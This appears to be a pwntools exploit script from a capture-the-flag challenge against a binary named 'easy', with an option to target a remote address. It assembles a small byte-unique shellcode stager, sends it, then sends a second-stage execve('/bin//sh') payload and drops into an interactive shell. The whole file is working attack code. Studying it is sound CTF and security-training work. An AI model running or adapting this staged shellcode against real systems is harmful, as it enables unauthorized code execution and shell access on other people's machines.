import struct
import random

from pwn import *
from pwnlib import util

from keystone import *

REMOTE = False 

if REMOTE:
  p = remote('52.69.40.204', 8361)
else:
  p = process("easy")

ks = Ks(KS_ARCH_X86, KS_MODE_64)

print p.recv()

# encoding, n = ks.asm("mul esi; push rax; mov edi, 0x6e69622f; mov eax, 0x68732e2d; or ax, 0x0102; push rdi; mov rdi, rsp; mov al, 0x3b; syscall")
# encoding, n = ks.asm("sub sp, 0xff0; mov rsi, [rsp]; add dl, 0x20; syscall")
# encoding, n = ks.asm("mov bh, 0xff; shl ebx, 4; sub rsp, rbx; pop rsi; add dl, 0x20; syscall; jmp rsi")
encoding, n = ks.asm("inc ch; shl cx, 4; sub ecx, 0x10; sub rsp, rcx; pop rsi; add dl, 0x30; syscall; jmp rsi")

print "Shellcode size: {}".format(len(encoding))

assert(len(encoding) < 0x18)

print "running: {}".format([hex(b) for b in encoding])

for e in encoding:
  if encoding.count(e) > 1:
    print "{} occurs multiple times!".format(hex(e))
    exit(1)

payload = "".join(chr(e) for e in encoding) + "wxyz"

shencoding, n = ks.asm("add rsp, 0x100; xor rax, rax; xor rsi, rsi; mul esi; push rax; mov rdi, 0x68732f2f6e69622f; push rdi; mov rdi, rsp; mov al, 0x3b; syscall")
shpayload = "".join(chr(e) for e in shencoding)

with open('payload', 'w') as f:
     f.write(payload)
     f.write(shpayload)

print payload

p.send(payload)

print p.recv()

p.send(shpayload)

p.interactive()
